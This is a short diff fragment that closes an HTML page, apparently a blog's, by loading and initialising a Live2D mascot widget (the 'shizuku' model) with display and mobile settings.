+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"tagMode":false});</script></body>
+</html>
